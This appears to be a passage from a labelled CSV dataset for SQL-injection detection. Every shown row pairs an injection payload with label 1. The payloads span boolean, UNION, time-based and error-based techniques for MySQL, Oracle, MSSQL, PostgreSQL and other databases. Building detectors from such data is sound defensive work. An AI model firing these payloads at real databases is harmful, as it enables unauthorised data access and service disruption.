,Sentence,Label
10646,"1'  )  )   or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and   (  (  'cdaq' like 'cdaq",1
10647,"1 )  union all select null,null,null,null,null#",1
10648,1'  )  )   as jzoh where 6484 = 6484 and 7364 = 4233--,1
10649,"1 )  where 2781 = 2781 or 5286 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
10650,"-9764' where 1266 = 1266 or elt ( 4069 = 6162,6162 ) --",1
10651,1 and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) -- knpw,1
10652,1%' rlike  ( select * from  ( select ( sleep ( 5  )  )   ) vwyq ) #,1
10653,1 where 3802 = 3802 and 2006 = 2006,1
10654,"-4355""  )  )   )  or 9323 = 9323#",1
10655,"1""  )  )   as ihfw where 3949 = 3949 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1
10656,1  )  )   as trin where 8843 = 8843,1
10657,1'|| ( select 'xdzp' from dual where 5786 = 5786 and  ( 3020 = 3020 ) *6703 ) ||',1
10658,-3881  )  )   )  union all select 4438--,1
10659,select sleep ( 5 )  and   (  (   ( '%' = ',1
10660,1'+ ( select 'dkxk' where 1241 = 1241 waitfor delay '0:0:5'--,1
10661,"1"" )  and elt ( 6651 = 1172,1172 )  and  ( ""zfkb"" like ""zfkb",1
10662,"1"" )  and 6565 = 2647 and  ( ""mrge"" like ""mrge",1
10663,"1'+ ( select dgnt where 4701 = 4701 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1
10664,-8729'+ ( select 'nbzl' where 7160 = 7160 order by 1#,1
10665,"1%' )  or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  and  ( '%' = '",1
10666,"1  )  )   as ynzg where 1926 = 1926 or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a ) --",1
10667,"1  )  )   )  or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and   (  (   ( 7589 = 7589",1
10668,1 )  as hhly where 2906 = 2906,1
10669,"1'  )  )   ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   )  and   (  (  'pcim' = 'pcim",1
10670,1 )  as vqbf where 4020 = 4020,1
10671,"-8881%' union all select 8420,8420,8420,8420,8420,8420,8420#",1
10672,"1 )  union all select null,null--",1
10673,"1'|| ( select 'rqzu' from dual where 9516 = 9516 or elt ( 5873 = 5873,sleep ( 5  )  )  #",1
10674,1'  )  )   as gfzb where 7904 = 7904,1
10675,"1%""  )  )   )  and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )  and   (  (   ( ""%"" = """,1
10676,"-9779'  )  )   or make_set ( 9354 = 9354,7185 )  and   (  (  'hmzj' = 'hmzj",1
10677,"1' where 9156 = 9156 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
10678,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and 'ekhi' = 'ekhi",1
10679,"1%'  )  )   procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75  )  )    )  )   ) ,1 ) #",1
10680,-7430' )  as xfah where 1596 = 1596 or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual ) --,1
10681,-1648  )  )   as oqqy where 3459 = 3459 or 6872 = 6872--,1
10682,"-7731""  )  )   or make_set ( 2551 = 4389,4389 )  and   (  (  ""unly"" like ""unly",1
10683,"-5372"" )  as wlqm where 2432 = 2432 union all select 2432,2432,2432,2432,2432,2432#",1
10684,"-9996' or make_set ( 1237 = 7111,7111 ) ",1
10685,select  ( case when  ( 4690 = 4373 )  then 4690 else 1/ ( select 0 )  end ) --,1
10686,"-6815 where 7609 = 7609 or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",1
10687,select  ( case when  ( 7005 = 7118 )  then 1 else 7005* ( select 7005 from master..sysdatabases )  end ) --,1
10688,"1  )  )   as xsyk where 2575 = 2575 or 8156 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1
10689,"1 )  where 7815 = 7815 union all select null,null,null,null,null,null,null#",1
10690,select sleep ( 5 )  and 'eskp' like 'eskp,1
10691,"1"" )  as advz where 5166 = 5166 or 8156 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1
10692,"1""  )  )   )  and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (   ( ""fogb"" like ""fogb",1
10693,"1"" )  as vpna where 5450 = 5450 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
10694,1' rlike sleep ( 5 )  and 'gtfo' = 'gtfo,1
10695,-8966%' or  ( 7475 = 4014 ) *4014 and '%' = ',1
10696,1 )  as sdnd where 9472 = 9472,1
10697,1  )  )   )  and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (   ( 5368 = 5368,1
10698,"1%"" rlike sleep ( 5 )  and ""%"" = """,1
10699,"-9944""  )  )   or 8537 = 2039 and   (  (  ""kfzj"" = ""kfzj",1
10700,"1%"" )  and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1
10701,"-3347'+ ( select xuzs where 1076 = 1076 union all select 1076,1076,1076,1076,1076--",1
10702,"1'  )  )   )  and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (   ( 'lyem' like 'lyem",1
10703,"-7764"" or 7308 = 7805",1
10704,"1%'  )  )   union all select null,null,null,null,null,null,null,null,null,null--",1
10705,1' in boolean mode )  and sleep ( 5 ) #,1
10706,"-4152"" )  where 9781 = 9781 union all select 9781,9781,9781,9781,9781--",1
10707,"1"" and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   ) ",1
10708,"1%"" )  or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
10709,"-6122"" )  union all select 6578,6578--",1
10710,select  ( case when  ( 5768 = 9169 )  then 5768 else 1/ ( select 0 )  end ) --,1
10711,"1' where 9003 = 9003 and make_set ( 5868 = 8316,8316 ) --",1
10712,"1""  )  )   )  or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )   and   (  (   ( ""dzse"" = ""dzse",1
10713, ( select  ( case when  ( 8130 = 5894 )  then 8130 else 8130* ( select 8130 from information_schema.character_sets )  end  )  )  ,1
10714,select case when 4537 = 8418 then 1 else null end--,1
10715,1 or 6793 =  ( select 6793 from pg_sleep ( 5  )  )  -- fyaq,1
10716,"1 and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a ) -- jpqa",1
10717,"1"" )  where 5298 = 5298 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )  --",1
10718,"-4966%"" union all select 4300,4300,4300,4300,4300,4300,4300,4300#",1
10719,"1' )  or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and  ( 'lqql' = 'lqql",1
10720,"iif ( 3447 = 1084,1,1/0 ) ",1
10721,"1'  )  )   )  and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 )  and   (  (   ( 'vfnl' = 'vfnl",1
10722,"1' )  and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and  ( 'pgyl' = 'pgyl",1
10723,1'|| ( select 'uedk' where 4655 = 4655,1
10724,"1%"" or 5356 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
10725,"1' or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1
10726,select  ( case when  ( 1291 = 6612 )  then 1 else 1291* ( select 1291 from master..sysdatabases )  end ) --,1
10727,-2429%' or 6890 = 5846,1
10728,"1%""  )  )   )  or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )   and   (  (   ( ""%"" = """,1
10729,-4761 order by 1--,1
10730,1' or  ( select * from  ( select ( sleep ( 5  )  )   ) sddo ) #,1
10731,"-4394'  )  )   union all select 3409,3409--",1
10732,-2960' or 2163 = 3143--,1
10733,1' )  where 1645 = 1645 rlike sleep ( 5 ) --,1
10734,"-6890""  )  )   )  union all select 1115#",1
10735,1 )  where 4479 = 4479 rlike  ( select  ( case when  ( 6351 = 4367 )  then 1 else 0x28 end  )  )  --,1
10736,"select * from generate_series ( 2317,2317,case when  ( 2317 = 9706 )  then 1 else 0 end )  limit 1--",1
10737,"select * from generate_series ( 3427,3427,case when  ( 3427 = 7516 )  then 1 else 0 end )  limit 1--",1
10738,"1"" and elt ( 4249 = 4249,7259 ) ",1
10739,"1'  )  )   as ewyk where 4828 = 4828 and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   ) --",1
10740,"select count ( * )  from generate_series ( 1,5000000 )  and ""%"" = """,1
10741,"-8186%' or elt ( 1032 = 1032,3623 )  and '%' = '",1
10742,1  )  )   rlike sleep ( 5 )  and   (  (  8773 = 8773,1
10743,select case when 7649 = 9297 then 1 else null end--,1
10744,"-2872 )  where 8797 = 8797 or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",1
10745,"-7255' union all select 2127,2127,2127,2127,2127#",1
10746,"1' )  where 1363 = 1363 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --",1
10747,"1%""  )  )   or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 )  and   (  (  ""%"" = """,1
10748,"1'|| ( select 'jpow' from dual where 4381 = 4381 and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a  )  )  ||'",1
10749,1 )  as tbve where 4828 = 4828,1
10750,1'+ ( select iwbs where 4939 = 4939,1
10751,"1' in boolean mode )  union all select null,null,null,null,null--",1
10752,"-4385%'  )  )   union all select 6694,6694,6694,6694,6694,6694,6694,6694,6694,6694#",1
10753,select  ( case when  ( 7271 = 1658 )  then 7271 else 7271* ( select 7271 from information_schema.character_sets )  end ) #,1
10754,1' )  as fksm where 9714 = 9714,1
10755,"1 where 1153 = 1153 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )  --",1
10756,1 )  as drgs where 1989 = 1989 order by 1--,1
10757,"1' and 2388 = benchmark ( 5000000,md5 ( 0x6d457153  )  )  #",1
10758,"1'  )  )   as kwre where 7775 = 7775 and 9254 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
10759,"select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  (   ( 'qhgp' = 'qhgp",1
10760,"1' )  or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )   and  ( 'blnh' like 'blnh",1
10761,-1499 )  as gxfm where 9762 = 9762 or 5989 = 4782--,1
10762,"1""  )  )   and 9660 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
10763,1'+ ( select 'toec' where 5810 = 5810 and sleep ( 5  )  )  +',1
10764,"1 or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) ",1
10765,-4023 or  ( 8779 = 5716 ) *5716,1
10766,1'|| ( select 'eyiy' from dual where 8127 = 8127,1
10767,"select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and  ( 'vfxg' like 'vfxg",1
10768,"1', ( begin if  ( 8340 = 8340 )  then dbms_lock.sleep ( 5 ) ",1
10769,"1""  )  )   as daqd where 4390 = 4390 and elt ( 3114 = 3114,sleep ( 5  )  )  #",1
10770,"-2009%' union all select 1991,1991#",1
10771,"1'  )  )   or elt ( 6272 = 6272,sleep ( 5  )  )   and   (  (  'fele' = 'fele",1
10772,"1%' )  and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and  ( '%' = '",1
10773,1 )  where 2199 = 2199 or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu ) --,1
10774,"1' where 4417 = 4417 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",1
10775,"-1620  )  )   union all select 6257,6257,6257,6257,6257,6257,6257,6257,6257,6257--",1
10776,"1'+ ( select 'opqr' where 2442 = 2442 or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
10777,"1"" and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )  ",1
10778,"1 )  where 9206 = 9206 union all select null,null,null,null,null,null#",1
10779,"1'+ ( select 'ycsv' where 3628 = 3628 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
10780,"1%"" )  and 7533 = 7533 and  ( ""%"" = """,1
10781,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  # lchh",1
10782,"1'|| ( select 'uusj' where 2149 = 2149 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   ) ||'",1
10783,"1 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )  # fmxq",1
10784,"-1512 union all select 9013,9013,9013,9013#",1
10785,"1' or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  ",1
10786,"1' )  and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
10787,1 waitfor delay '0:0:5'-- nnnp,1
10788,"1' or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) ",1
10789,1'  )  )   as yqek where 1957 = 1957,1
10790,"1""  )  )   )  and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (   ( ""fjwv"" like ""fjwv",1
10791,1 )  as hggi where 6511 = 6511,1
10792,"1'  )  )   or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and   (  (  'gxpr' = 'gxpr",1
10793,"-6662""  )  )   union all select 6755--",1
10794,1'+ ( select 'hplm' where 4008 = 4008 and 8594 =  ( select 8594 from pg_sleep ( 5  )  )  --,1
10795,"1'  )  )   )  and 9254 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
10796,"1""  )  )   and make_set ( 8266 = 9226,9226 )  and   (  (  ""omjx"" like ""omjx",1
10797,1'|| ( select 'oxdh' where 6967 = 6967 and sleep ( 5 ) #,1
10798,select  ( case when  ( 5698 = 3453 )  then 5698 else 1/ ( select 0 )  end ) --,1
10799,"-5776%' union all select 3075,3075,3075,3075,3075--",1
10800,"1'  )  )   as oldh where 9551 = 9551 union all select null,null,null#",1
10801,1 rlike sleep ( 5 ) #,1
10802,1 )  rlike  ( select  ( case when  ( 5477 = 7492 )  then 1 else 0x28 end  )  )   and  ( 4427 = 4427,1
10803,"1"" and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and ""sckh"" = ""sckh",1
10804,"1"" )  where 1607 = 1607",1
10805,1%'  )  )   or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu )  and   (  (  '%' = ',1
10806,"-4194""  )  )   )  or 4747 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (   ( ""ddbc"" like ""ddbc",1
10807,"1  )  )   as rual where 4649 = 4649 and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   ) --",1
10808,"1%""  )  )   union all select null--",1
10809,1'+ ( select 'czpg' where 6627 = 6627 and 2006 = 2006,1
10810,"select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  (   ( ""%"" = """,1
10811,1' )  rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo )  and  ( 'zqiw' = 'zqiw,1
10812,-1564' )  order by 1--,1
10813,"1%' union all select null,null,null,null,null,null,null,null,null,null--",1
10814,"-7060' )  or make_set ( 4233 = 1689,1689 )  and  ( 'twpr' like 'twpr",1
10815,"1'  )  )   union all select null,null,null,null,null,null,null,null,null,null#",1
10816,"1"" where 8333 = 8333",1
10817,if ( 6745 = 4078 )  select 6745 else drop function ytyt--,1
10818,1%' and 1736 = 4220,1
10819,"-7528' or make_set ( 3809 = 1821,1821 )  and 'kgch' = 'kgch",1
10820,"-8153' where 2436 = 2436 union all select 2436,2436,2436,2436,2436,2436,2436,2436,2436,2436#",1
10821,"1'|| ( select 'fcws' from dual where 9184 = 9184 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161  )  )  ||'",1
10822,"1"" )  as tecq where 4817 = 4817 and 8189 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
10823,"1"" or elt ( 5873 = 5873,sleep ( 5  )  )  #",1
10824,"1 )  or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and  ( 7984 = 7984",1
10825,1'|| ( select 'bsbv' from dual where 5276 = 5276 or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu  )  )  ||',1
10826,"-9810' )  where 4361 = 4361 or elt ( 1032 = 1032,3623 ) --",1
10827,"1%"" )  rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo )  and  ( ""%"" = """,1
10828,"1""  )  )   and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (  ""xqlh"" = ""xqlh",1
10829,1'  )  )   waitfor delay '0:0:5'--,1
10830,"-8093""  )  )   as oboi where 1476 = 1476 union all select 1476,1476,1476,1476#",1
10831,"1"" where 9341 = 9341",1
10832,"-3703""  )  )   )  union all select 3293,3293,3293,3293,3293,3293,3293,3293,3293,3293#",1
10833,"1  )  )   )  procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 )  and   (  (   ( 7813 = 7813",1
10834,1 and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) -- izad,1
10835,"select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) ||'",1
10836,"1' in boolean mode )  or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1
10837,"-4453'  )  )   )  or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (   ( 'boxt' = 'boxt",1
10838,"-3130 )  union all select 1741,1741,1741,1741,1741,1741,1741,1741#",1
10839,"-4233%"" )  or  ( 8459 = 8459 ) *4906 and  ( ""%"" = """,1
10840,"1  )  )   union all select null,null,null,null,null,null,null,null,null--",1
10841,"-5528' )  union all select 5153,5153,5153,5153,5153,5153,5153,5153,5153#",1
10842,"-4589"" )  union all select 1441,1441,1441,1441,1441,1441,1441,1441,1441,1441--",1
10843,"1', ( cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select 1 from generate_series ( 8979,8979,case when  ( 8979 = 8979 )  then 1 else 0 end )  limit 1 ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric  )  )  ",1
10844,-8224' )  where 6504 = 6504 or 2461 = 5660,1
10845,"1 where 7196 = 7196 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )  --",1
10846,"1 where 6881 = 6881 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 ) --",1
10847,"-5130'  )  )   union all select 5218,5218,5218,5218,5218,5218,5218,5218,5218,5218--",1
10848,"-7797'+ ( select oulr where 7091 = 7091 union all select 7091,7091,7091,7091,7091,7091,7091,7091,7091#",1
10849,-3125'  )  )   )  order by 1#,1
10850,"1"" union all select null,null,null,null,null,null,null,null#",1
10851,"1 )  and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) ",1
10852,-9087 or 3038 = 3038,1
10853,"1 )  as tgqd where 6369 = 6369 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) --",1
10854,select sleep ( 5 )  and   (  (  '%' = ',1
10855, end and 'huti' like 'huti,1
10856,-7346 or 8571 = 8571--,1
10857,"1"" )  union all select null,null,null,null--",1
10858,-8015 )  where 9808 = 9808 or 9323 = 9323#,1
10859,"1'  )  )   )  or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and   (  (   ( 'gucd' = 'gucd",1
10860,select  ( case when  ( 8978 = 1426 )  then 1 else 8978* ( select 8978 from master..sysdatabases )  end ) --,1
